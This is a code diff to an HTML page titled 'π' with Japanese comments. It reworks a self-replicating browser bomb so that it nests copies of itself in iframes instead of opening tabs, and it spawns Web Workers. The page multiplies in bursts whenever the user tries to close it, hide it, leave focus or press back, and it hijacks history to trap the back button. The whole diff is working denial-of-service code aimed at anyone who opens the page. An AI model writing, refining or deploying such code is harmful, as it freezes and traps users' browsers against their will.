@@ -3,20 +3,60 @@
 <head>
   <meta charset="UTF-8">
   <title>π</title>
+  <style>
+    body { margin: 0; padding: 0; overflow: hidden; background: #000; }
+    h1 { color: #0f0; text-align: center; padding: 20px; font-family: monospace; }
+    #container { 
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 2px;
+      height: calc(100vh - 80px);
+    }
+    iframe { width: 100%; height: 100%; border: 1px solid #333; }
+    #counter { color: #f00; text-align: center; font-family: monospace; font-size: 24px; }
+  </style>
 </head>
 <body>
-  <h1>π</h1>
+  <h1>π増殖中...</h1>
+  <div id="counter">子: 0 / 孫: 0</div>
+  <div id="container"></div>
 
   <script>
     (function eternal() {
       const workers = [];
+      const container = document.getElementById('container');
+      const counterEl = document.getElementById('counter');
+      let childCount = 0;
 
-      function spawnTab() {
-        const w = window.open(location.href, '_blank');
-        if (!w) {
-          // ポップアップブロックされたら現在のタブ内でさらに挑戦
-          setTimeout(() => spawnTab(), 100);
-        }
+      // 自分がiframe内なら親にカウント通知
+      function isInIframe() {
+        try { return window.self !== window.top; } catch(e) { return true; }
+      }
+
+      if (isInIframe()) {
+        document.querySelector('h1').textContent = 'π[孫]';
+        document.body.style.background = '#111';
+      }
+
+      function spawnIframe() {
+        const iframe = document.createElement('iframe');
+        iframe.src = location.href;
+        iframe.sandbox = 'allow-scripts allow-same-origin allow-popups allow-forms';
+        container.appendChild(iframe);
+        childCount++;
+        updateCounter();
+        
+        // iframe読み込まれたらさらに増殖させる
+        iframe.onload = () => {
+          try {
+            iframe.contentWindow.postMessage('spawn', '*');
+          } catch(e) {}
+        };
+      }
+
+      function updateCounter() {
+        const totalIframes = document.querySelectorAll('iframe').length;
+        counterEl.textContent = 'iframe: ' + totalIframes + ' | Worker: ' + workers.length;
       }
 
       function spawnWorker() {
@@ -34,30 +74,39 @@
         `], { type: 'text/javascript' });
         const w = new Worker(URL.createObjectURL(blob));
         workers.push(w);
+        updateCounter();
       }
 
       function explode(d) {
         for (let i = 0; i < 2 ** d; i++) {
-          spawnTab();
+          spawnIframe();
           spawnWorker();
         }
-        if (d < 5) {
-          setTimeout(() => explode(d + 1), 200);
+        if (d < 4) {
+          setTimeout(() => explode(d + 1), 300);
         }
       }
 
-      // 開いた瞬間から定期的に自己増殖（5秒ごと）
-      setInterval(() => {
-        spawnTab();
-        spawnWorker();
-      }, 5000);
-
-      // 初回も即3つ増やす
-      for (let i = 0; i < 3; i++) {
-        setTimeout(() => {
-          spawnTab();
+      // 他iframeからの増殖命令を受け取る
+      window.addEventListener('message', (e) => {
+        if (e.data === 'spawn') {
+          spawnIframe();
           spawnWorker();
-        }, i * 500);
+        }
+      });
+
+      // 定期的に自己増殖
+      setInterval(() => {
+        spawnIframe();
+        spawnWorker();
+      }, 3000);
+
+      // 初回
+      for (let i = 0; i < 2; i++) {
+        setTimeout(() => {
+          spawnIframe();
+          spawnWorker();
+        }, i * 300);
       }
 
       // 閉じようとしたら爆増
@@ -68,33 +117,33 @@
         setTimeout(() => explode(2), 0);
       });
 
-      // 閉じられる瞬間も増やす
       window.addEventListener('pagehide', () => {
         for (let i = 0; i < 20; i++) {
-          spawnTab();
+          spawnIframe();
+          spawnWorker();
         }
       });
 
-      // タブが隠れたら増やす
+      // タブ隠れたら増やす
       document.addEventListener('visibilitychange', () => {
         if (document.hidden) {
           for (let i = 0; i < 5; i++) {
-            spawnTab();
+            spawnIframe();
             spawnWorker();
           }
         }
       });
 
-      // 戻るボタン潰し + 増殖
+      // 戻るボタン
       history.pushState(null, '', location.href);
       window.addEventListener('popstate', () => {
         history.pushState(null, '', location.href);
-        explode(3);
+        explode(2);
       });
 
-      // 右クリックとかでも増やす（おまけ）
+      // フォーカス失ったら
       window.addEventListener('blur', () => {
-        spawnTab();
+        spawnIframe();
         spawnWorker();
       });
     })();
